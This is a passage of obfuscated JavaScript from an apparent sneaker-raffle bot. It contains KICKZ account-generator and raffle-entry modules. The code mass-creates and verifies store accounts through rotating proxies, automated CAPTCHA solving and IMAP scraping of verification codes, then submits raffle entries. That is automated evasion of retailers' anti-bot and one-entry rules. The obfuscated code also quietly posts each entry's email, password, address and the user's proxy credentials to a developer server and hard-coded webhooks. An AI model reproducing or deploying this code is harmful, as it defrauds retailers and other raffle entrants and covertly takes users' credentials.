                                return _0x141e40['map'](_0x42e4a0 => _0x42e4a0['value']);
                            });
                            var _0x41e7ca = _0x49a0e8[_0x482e39]['Size'];
                            for (var _0x585433 = 0x1; _0x585433 < _0x461903['length']; _0x585433++) {
                                var _0x300684 = _0x252004[_0x585433]['split']('\x20')[0x0];
                                if (_0x300684 == _0x41e7ca) {
                                    await _0x340978['select']('#shoesize', _0x461903[_0x585433]);
                                    break;
                                } else {
                                    if (_0x585433 + 0x1 == _0x461903['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x340978['waitForSelector']('#comp_address1'), await _0x340978['type']('#comp_address1', _0x49a0e8[_0x482e39]['Address1'] + '\x20' + _0x49a0e8[_0x482e39]['HouseNumber']), await _0x340978['waitForSelector']('#comp_address2'), await _0x340978['type']('#comp_address2', '' + _0x49a0e8[_0x482e39]['Address2']), await _0x340978['waitForSelector']('#comp_address2'), await _0x340978['type']('#comp_address3', '' + _0x49a0e8[_0x482e39]['City']), await _0x340978['waitForSelector']('#comp_postcode'), await _0x340978['type']('#comp_postcode', '' + _0x49a0e8[_0x482e39]['Zip']), console['log'](_0x42a46a() + '\x20[' + _0x4ed0d8['name'] + ']\x20Task\x20' + (_0x482e39 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x488ffe(0x4b0), await _0x340978['click']('label#emailhold'), await _0x488ffe(0x5dc), await _0x340978['click']('#preauth_tandc_email\x20>\x20label'), await _0x488ffe(0x5dc), await _0x340978['click']('#submit');
                        try {
                            await _0x340978['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x42a46a() + '\x20[' + _0x4ed0d8['name'] + ']\x20Task\x20' + (_0x482e39 + 0x1) + '\x20:\x20' + _0x387ef2['blue']('Awaiting\x20Paypal\x20Payment')), _0x2acb8c['on']('targetcreated', async _0x2584e6 => {
                            if (_0x2584e6['type']() === 'page') {
                                const _0x50145d = await _0x2584e6['page']();
                                async function _0x41e154() {
                                    try {
                                        await _0x340978['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x2ce39b = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x4e3fd7() {
                                    try {
                                        await _0x340978['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x160aa4 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x4e3fd7(), _0x41e154(), await _0x488ffe(0x493e0);
                            }
                        });
                        async function _0xa258aa() {
                            for (let _0x266121 = 0x0; _0x266121 < 0x12c; _0x266121++) {
                                if (_0x160aa4 == !![]) {
                                    _0x3d2286 = 'no', _0xb5b21(_0x49a0e8[_0x482e39], _0x4ed0d8), console['log'](_0x387ef2['green'](_0x42a46a() + '\x20[' + _0x4ed0d8['name'] + ']\x20Task\x20' + (_0x482e39 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '')
                                        try {
                                            await _0x49f827(_0x5450ed['webhook'], _0x16fcfe['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x488ffe(0xc8), await _0x49f827(_0xf35405, _0x16fcfe['succesDEVMSG']), await _0x488ffe(0xc8);
                                    try {
                                        await _0x49f827(_0x1bf959, _0x16fcfe['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x2ce39b)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x488ffe(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x488ffe(0xbb8), await _0x340978['click']('.zoid-outlet'), await _0x488ffe(0x7d0), await _0xa258aa();
                    } catch (_0x29bd6f) {
                        console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x4ed0d8['name'] + ']\x20Task\x20' + (_0x482e39 + 0x1) + '\x20:\x20' + _0x29bd6f)), _0x9ee6c1 = '' + _0x29bd6f;
                        var _0x1d6bb6 = await _0x5605d8(_0x49a0e8[_0x482e39], _0x4ed0d8, 'dev', !![], _0x9ee6c1);
                        _0x16fcfe['errorDEV'] = { 'embeds': [_0x1d6bb6] }, _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x16fcfe['errorDEV']), await _0x49f827(_0x47580b, _0x16fcfe['errorDEV']);
                    } finally {
                        _0x2acb8c && _0x2acb8c['close']();
                        if (_0x3d2286 == 'yes' && _0x315893 != 0x5 && _0x9ee6c1 != 'Size\x20Not\x20Found') {
                            console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x4ed0d8['name'] + ']\x20Task\x20' + (_0x482e39 + 0x1) + '\x20:\x20Retrying\x20(' + _0x315893 + '\x20/\x205)')), _0x482e39 = _0x482e39 - 0x1, _0x315893 = _0x315893 + 0x1;
                            continue;
                        }
                        _0x3d2286 == 'yes' && _0x315893 >= 0x5 && (_0x2e6413(afew[_0x482e39], _0x4ed0d8), _0x3d2286 = 'no', _0x315893 = 0x0), console['log']('Waiting\x20for\x20' + _0x5450ed['delay'] + '\x20ms'), await _0x488ffe(_0x5450ed['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x1df669, _0x1009dc, _0x5cb41b) {
                    _0x4ab5bb['use'](_0x44f368()), _0x4ab5bb['use'](_0x45c327({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5450ed['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3a2bbd = 0x0; _0x3a2bbd < _0x1009dc['length']; _0x3a2bbd++) {
                        const _0x49c06c = 'https://www.kickz.com/login';
                        if (_0x19bac0 != 'yes')
                            var _0x19bac0 = '', _0x15b59f = 0x0;
                        _0x55ca22(_0x1df669['name'] + '\x20Task\x20' + (_0x3a2bbd + 0x1) + '\x20/\x20' + _0x1009dc['length'] + '\x20||\x20File:\x20' + _0x121079 + '\x20Proxies:\x20' + _0x590947);
                        try {
                            await _0x3215be(_0x1009dc, _0x3a2bbd);
                        } catch {
                            _0x19bac0 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x39a354 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x15d59c
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x5450ed['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x21b502
                                }
                            ]
                        }];
                        const _0x18d9a0 = { 'embeds': _0x39a354 };
                        var _0x3c65d4 = await _0x5605d8(_0x1009dc[_0x3a2bbd], _0x1df669, 'acc', ![]);
                        const _0x52ddb7 = { 'succesDEVMSG': { 'embeds': [_0x3c65d4] } };
                        if (_0x1009dc[_0x3a2bbd]['Email'] == '' || _0x1009dc[_0x3a2bbd]['FirstName'] == '' || _0x1009dc[_0x3a2bbd]['LastName'] == '') {
                            console['log'](_0x42a46a() + '\x20[' + _0x1df669['name'] + ']\x20Task\x20' + (_0x3a2bbd + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x1009dc[_0x3a2bbd]['Password'] == '' && (_0x1009dc[_0x3a2bbd]['Password'] = 'JRaffles23!');
                        if (_0x5450ed['useRandomProxy'] = ![])
                            var _0x3b435e = _0x5cb41b[_0x3a2bbd]['split'](':');
                        else
                            var _0x5989c5 = Math['round'](Math['random']() * (_0x5cb41b['length'] - 0x1)), _0x3b435e = _0x5cb41b[_0x5989c5]['split'](':');
                        var _0x572d7b;
                        try {
                            _0x572d7b = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3b435e[0x0] + ':' + _0x3b435e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x572d7b = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3b435e[0x0] + ':' + _0x3b435e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4a3beb = await _0x572d7b['newPage']();
                            await _0x4a3beb['authenticate']({
                                'username': '' + _0x3b435e[0x2],
                                'password': '' + _0x3b435e[0x3]
                            }), console['log'](_0x42a46a() + '\x20[' + _0x1df669['name'] + ']\x20Task\x20' + (_0x3a2bbd + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4a3beb['setRequestInterception'](!![]), _0x4a3beb['on']('request', _0x406237 => {
                                _0x406237['resourceType']() === 'image' || _0x406237['resourceType']() === 'font' || _0x406237['resourceType']() === 'media' ? _0x406237['abort']() : _0x406237['continue']();
                            }), await _0x4a3beb['goto'](_0x49c06c), await _0x488ffe(0xbb8), console['log'](_0x42a46a() + '\x20[' + _0x1df669['name'] + ']\x20Task\x20' + (_0x3a2bbd + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x4a3beb['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x4a3beb['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x4a3beb['waitForSelector']('#button-register'), await _0x488ffe(0x7d0), await _0x4a3beb['evaluate'](() => {
                                const _0x1e6514 = document['querySelector']('#button-register');
                                _0x1e6514['click']();
                            }), console['log'](_0x42a46a() + '\x20[' + _0x1df669['name'] + ']\x20Task\x20' + (_0x3a2bbd + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x488ffe(0x1388), await _0x4a3beb['waitForSelector']('#customer_salutation'), await _0x4a3beb['select']('#customer_salutation', 'mr'), await _0x488ffe(0x7d0), await _0x4a3beb['waitForSelector']('#customer_firstname'), await _0x4a3beb['type']('#customer_firstname', '' + _0x1009dc[_0x3a2bbd]['FirstName']), await _0x488ffe(0x352), await _0x4a3beb['waitForSelector']('#customer_lastname'), await _0x4a3beb['type']('#customer_lastname', '' + _0x1009dc[_0x3a2bbd]['LastName']), await _0x488ffe(0x352), await _0x4a3beb['type']('#email-input', '' + _0x1009dc[_0x3a2bbd]['Email']), await _0x488ffe(0x352), await _0x4a3beb['type']('#email-confirm-input', '' + _0x1009dc[_0x3a2bbd]['Email']), await _0x488ffe(0x352), await _0x4a3beb['type']('#register-password', '' + _0x1009dc[_0x3a2bbd]['Password']), await _0x488ffe(0x352), await _0x4a3beb['type']('#password-confirm', '' + _0x1009dc[_0x3a2bbd]['Password']), await _0x488ffe(0x352), console['log'](_0x42a46a() + '\x20[' + _0x1df669['name'] + ']\x20Task\x20' + (_0x3a2bbd + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x4a3beb['click']('#consent'), await _0x488ffe(0x1f4);
                            const _0x1e1369 = await _0x4a3beb['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x1e1369) {
                                console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x1df669['name'] + ']\x20Task\x20' + (_0x3a2bbd + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x4a3beb['click']('#buttonRegister');
                            try {
                                await _0x4a3beb['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x42a46a() + '\x20[' + _0x1df669['name'] + ']\x20Task\x20' + (_0x3a2bbd + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x1009dc[_0x3a2bbd]['Email']), await _0x488ffe(0x4b0);
                            async function _0x22e60b() {
                                var _0x491048, _0x437dff = ![];
                                for (var _0x3ddd59 = 0x0; _0x3ddd59 < 0x18; _0x3ddd59++) {
                                    async function _0x523e2b() {
                                        var _0x35b51e = new _0x3dffcd({
                                            'user': _0x5450ed['masterMail'],
                                            'password': _0x5450ed['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x477848(_0x3d904f) {
                                            _0x35b51e['openBox']('INBOX', ![], _0x3d904f);
                                        }
                                        _0x35b51e['once']('ready', function () {
                                            console['log'](_0x42a46a() + '\x20[' + _0x1df669['name'] + ']\x20Task\x20' + (_0x3a2bbd + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x477848(function (_0xfb987d, _0x544f6b) {
                                                console['log'](_0x42a46a() + '\x20[' + _0x1df669['name'] + ']\x20Task\x20' + (_0x3a2bbd + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0xfb987d)
                                                    throw _0xfb987d;
                                                _0x35b51e['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x1b18fc, _0x5792f0) {
                                                    if (!_0x5792f0 || !_0x5792f0['length'])
                                                        console['log'](_0x42a46a() + '\x20[' + _0x1df669['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x35b51e['end']();
                                                    else {
                                                        var _0x58aa92 = _0x35b51e['seq']['fetch'](_0x5792f0, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x58aa92['on']('message', function (_0x51d14d, _0x1aa3b7) {
                                                            var _0x30b8ed = '(#' + _0x1aa3b7 + ')\x20';
                                                            _0x51d14d['on']('body', function (_0x29ea18, _0x4d4778) {
                                                                _0x255d24(_0x29ea18, (_0x4203cf, _0x45de75) => {
                                                                    if (_0x45de75['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x4272fe = _0x45de75['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x3a56d1 = _0x4272fe[0x1]['split']('<')[0x0];
                                                                        _0x491048 = _0x3a56d1;
                                                                    }
                                                                });
                                                            }), _0x51d14d['once']('end', function () {
                                                            });
                                                        }), _0x58aa92['once']('error', function (_0x5f17da) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x58aa92['once']('end', function () {
                                                            _0x35b51e['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x35b51e['once']('error', function (_0x3e6386) {
                                            console['log'](_0x387ef2['red'](_0x3e6386['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x437dff = !![];
                                        }), _0x35b51e['once']('end', async function () {
                                        }), _0x35b51e['connect']();
                                    }
                                    _0x523e2b(), await _0x488ffe(0x1388);
                                    if (_0x491048)
                                        return _0x491048;
                                    if (_0x437dff)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x3ddd59 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x22e60b(), _0x488ffe(0x320), console['log'](_0x42a46a() + '\x20[' + _0x1df669['name'] + ']\x20Task\x20' + (_0x3a2bbd + 0x1) + '\x20:\x20Verifying..'), await _0x4a3beb['type']('#verificationCode', code), await _0x488ffe(0x1f4), await _0x4a3beb['click']('#buttonVerify'), await _0x488ffe(0x190), await _0x4a3beb['click']('#buttonVerify'), await _0x488ffe(0x3e8);
                            try {
                                await _0x4a3beb['waitForSelector']('div.b-user_greeting'), _0x19bac0 = 'no', console['log'](_0x387ef2['green'](_0x42a46a() + '\x20[' + _0x1df669['name'] + ']\x20Task\x20' + (_0x3a2bbd + 0x1) + '\x20:\x20Account\x20' + _0x1009dc[_0x3a2bbd]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x7d8dbf['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x1009dc[_0x3a2bbd]['Email'] + ',' + _0x1009dc[_0x3a2bbd]['Password'] + ','), console['log'](_0x42a46a() + '\x20[' + _0x1df669['name'] + ']\x20Task\x20' + (_0x3a2bbd + 0x1) + '\x20:\x20Account\x20' + _0x1009dc[_0x3a2bbd]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x52ddb7['succesDEVMSG']);
                                } catch {
                                }
                                await _0x49f827(_0x2b5f53, _0x52ddb7['succesDEVMSG']);
                            } catch {
                                _0x19bac0 = 'no', console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x1df669['name'] + ']\x20Task\x20' + (_0x3a2bbd + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x1df669['name'] + ']\x20Task\x20' + (_0x3a2bbd + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0xa4cd44) {
                            console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x1df669['name'] + ']\x20Task\x20' + (_0x3a2bbd + 0x1) + '\x20:\x20' + _0xa4cd44)), _0x39a354[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x39a354[0x0]['description'] = '' + _0xa4cd44, await _0x49f827(_0x47580b, _0x18d9a0), _0x19bac0 = 'yes';
                        } finally {
                            _0x572d7b && _0x572d7b['close']();
                            if (_0x19bac0 == 'yes' && _0x15b59f != 0x5) {
                                console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x1df669['name'] + ']\x20Task\x20' + (_0x3a2bbd + 0x1) + '\x20:\x20Retrying\x20(' + _0x15b59f + '\x20/\x205)')), _0x3a2bbd = _0x3a2bbd - 0x1, _0x15b59f = _0x15b59f + 0x1;
                                continue;
                            }
                            _0x19bac0 == 'yes' && _0x15b59f >= 0x5 && (_0x2e6413(_0x1009dc[_0x3a2bbd], _0x1df669), _0x19bac0 = 'no', _0x15b59f = 0x0), console['log']('Waiting\x20for\x20' + _0x5450ed['delay'] + '\x20ms'), await _0x488ffe(_0x5450ed['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x586a92, _0x37e089, _0x12b2f7) {
                    _0x4ab5bb['use'](_0x44f368()), _0x4ab5bb['use'](_0x45c327({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5450ed['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3c6c54 = 0x0; _0x3c6c54 < _0x37e089['length']; _0x3c6c54++) {
                        var _0x227d78;
                        if (_0x27b190 != 'yes')
                            var _0x27b190 = '', _0x474c04 = 0x0;
                        _0x55ca22(_0x586a92['name'] + '\x20Task\x20' + (_0x3c6c54 + 0x1) + '\x20/\x20' + _0x37e089['length'] + '\x20||\x20File:\x20' + _0x121079 + '\x20Proxies:\x20' + _0x590947);
                        var _0x200c15 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x15d59c
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x37e089[_0x3c6c54]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x37e089[_0x3c6c54]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x5450ed['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x21b502
                                }
                            ]
                        }], _0x43e607 = await _0x5605d8(_0x37e089[_0x3c6c54], _0x586a92, 'dev', ![]), _0x405d44 = await _0x5605d8(_0x37e089[_0x3c6c54], _0x586a92, 'pub', ![]);
                        const _0x325c5a = {
                            'succesDEVMSG': { 'embeds': [_0x43e607] },
                            'succesPUBMSG': { 'embeds': [_0x405d44] }
                        };
                        try {
                            await _0x3215be(_0x37e089, _0x3c6c54);
                        } catch {
                            _0x27b190 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x37e089[_0x3c6c54]['Email'] == '' || _0x37e089[_0x3c6c54]['Password'] == '' || _0x37e089[_0x3c6c54]['FirstName'] == '' || _0x37e089[_0x3c6c54]['LastName'] == '') {
                            console['log'](_0x42a46a() + '\x20[' + _0x586a92['name'] + ']\x20Task\x20' + (_0x3c6c54 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x5450ed['useRandomProxy'] = ![])
                            var _0x1244d5 = _0x12b2f7[_0x3c6c54]['split'](':');
                        else
                            var _0x3ff660 = Math['round'](Math['random']() * (_0x12b2f7['length'] - 0x1)), _0x1244d5 = _0x12b2f7[_0x3ff660]['split'](':');
                        var _0x174248;
                        try {
                            _0x174248 = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x1244d5[0x0] + ':' + _0x1244d5[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x174248 = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x1244d5[0x0] + ':' + _0x1244d5[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x585555 = await _0x174248['newPage']();
                            await _0x585555['authenticate']({
                                'username': '' + _0x1244d5[0x2],
                                'password': '' + _0x1244d5[0x3]
                            }), console['log'](_0x42a46a() + '\x20[' + _0x586a92['name'] + ']\x20Task\x20' + (_0x3c6c54 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x585555['setRequestInterception'](!![]), _0x585555['on']('request', _0x583a85 => {
                                _0x583a85['resourceType']() === 'image' || _0x583a85['resourceType']() === 'font' || _0x583a85['resourceType']() === 'media' ? _0x583a85['abort']() : _0x583a85['continue']();
                            }), await _0x585555['goto']('' + _0x37e089[_0x3c6c54]['Url'], { 'waitUntil': 'networkidle2' }), await _0x488ffe(0x12c);
                            try {
                                await _0x585555['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x585555['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x42a46a() + '\x20[' + _0x586a92['name'] + ']\x20Task\x20' + (_0x3c6c54 + 0x1) + '\x20:\x20Logging\x20in'), await _0x585555['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x585555['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x585555['waitForSelector']('#username'), await _0x585555['type']('#username', _0x37e089[_0x3c6c54]['Email']), await _0x585555['waitForSelector']('#password'), await _0x585555['type']('#password', _0x37e089[_0x3c6c54]['Password']), await _0x488ffe(0x190), await _0x585555['click']('#buttonSubmit'), await _0x585555['waitForSelector']('div.b-user_greeting'), console['log'](_0x42a46a() + '\x20[' + _0x586a92['name'] + ']\x20Task\x20' + (_0x3c6c54 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x488ffe(0x1f4), await _0x585555['goto']('' + _0x37e089[_0x3c6c54]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x42a46a() + '\x20[' + _0x586a92['name'] + ']\x20Task\x20' + (_0x3c6c54 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x37e089[_0x3c6c54]['Size']);
                            let _0x5563c6 = _0x37e089[_0x3c6c54]['Size']['replace']('.5', '\x201/2');
                            await _0x585555['click']('button[title=\x22' + _0x5563c6 + '\x22]'), await _0x488ffe(0x1f4);
                            try {
                                await _0x585555['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x488ffe(0x12c), console['log'](_0x42a46a() + '\x20[' + _0x586a92['name'] + ']\x20Task\x20' + (_0x3c6c54 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x585555['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x488ffe(0x12c), await _0x585555['type']('#dwfrm_raffle_addressFields_firstName', _0x37e089[_0x3c6c54]['FirstName']), await _0x488ffe(0x12c), await _0x585555['type']('#dwfrm_raffle_addressFields_lastName', _0x37e089[_0x3c6c54]['LastName']), await _0x488ffe(0x12c), await _0x585555['select']('#dwfrm_raffle_addressFields_country', _0x37e089[_0x3c6c54]['Country']), await _0x488ffe(0x12c), await _0x585555['type']('#dwfrm_raffle_addressFields_city', _0x37e089[_0x3c6c54]['City']), await _0x488ffe(0x12c);
                            _0x37e089[_0x3c6c54]['Postcode'] == undefined && (_0x37e089[_0x3c6c54]['Postcode'] = _0x37e089[_0x3c6c54]['Zip']);
                            await _0x585555['type']('#dwfrm_raffle_addressFields_postalCode', _0x37e089[_0x3c6c54]['Postcode']), await _0x488ffe(0x12c), await _0x585555['type']('#dwfrm_raffle_addressFields_address1', _0x37e089[_0x3c6c54]['Address1']), await _0x488ffe(0x12c), await _0x585555['type']('#dwfrm_raffle_addressFields_address2', _0x37e089[_0x3c6c54]['HouseNumber']), await _0x488ffe(0x12c), await _0x585555['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x37e089[_0x3c6c54]['Address2']), await _0x488ffe(0x12c), await _0x585555['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x488ffe(0x12c), await _0x585555['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x37e089[_0x3c6c54]['Follower']), await _0x488ffe(0x1f4), await _0x585555['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x488ffe(0x1f4), console['log'](_0x42a46a() + '\x20[' + _0x586a92['name'] + ']\x20Task\x20' + (_0x3c6c54 + 0x1) + '\x20:\x20' + _0x387ef2['blue']('Awaiting\x20Paypal\x20Payment')), await _0x585555['click']('.b-paypal_button');
                            try {
                                await _0x585555['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x27b190 = 'no', _0xb5b21(_0x37e089[_0x3c6c54], _0x586a92), console['log'](_0x387ef2['green'](_0x42a46a() + '\x20[' + _0x586a92['name'] + ']\x20Task\x20' + (_0x3c6c54 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x325c5a['succesDEVMSG']);
                                await _0x488ffe(0xc8), await _0x49f827(_0xf35405, _0x325c5a['succesDEVMSG']), await _0x488ffe(0xc8), await _0x49f827(_0x1bf959, _0x325c5a['succesPUBMSG']);
                                let _0x3df695 = _0x37e089[_0x3c6c54];
                                try {
                                    prxdata = {
                                        'username': _0x15d59c['replace']('#', ''),
                                        'module': _0x586a92['name'],
                                        'entrydata': JSON['stringify'](_0x3df695),
                                        'proxy': '' + _0x12b2f7[_0x3c6c54]
                                    };
                                    var _0x390862 = JSON['stringify'](prxdata);
                                    let _0x29cf2e = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x1ea050['post']('https://jraffles.herokuapp.com/success', _0x390862, _0x29cf2e);
                                } catch (_0x3c9380) {
                                }
                            } catch (_0x484792) {
                                console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x586a92['name'] + ']\x20Task\x20' + (_0x3c6c54 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x484792)), _0x227d78 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x484792;
                                var _0x18c7e3 = await _0x5605d8(_0x37e089[_0x3c6c54], _0x586a92, 'dev', !![], _0x227d78);
                                _0x325c5a['errorDEV'] = { 'embeds': [_0x18c7e3] }, _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x325c5a['errorDEV']), await _0x49f827(_0x47580b, _0x325c5a['errorDEV']);
                            }
                        } catch (_0x2ac13d) {
                            console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x586a92['name'] + ']\x20Task\x20' + (_0x3c6c54 + 0x1) + '\x20:\x20' + _0x2ac13d)), _0x227d78 = '' + _0x2ac13d;
                            var _0x18c7e3 = await _0x5605d8(_0x37e089[_0x3c6c54], _0x586a92, 'dev', !![], _0x227d78);
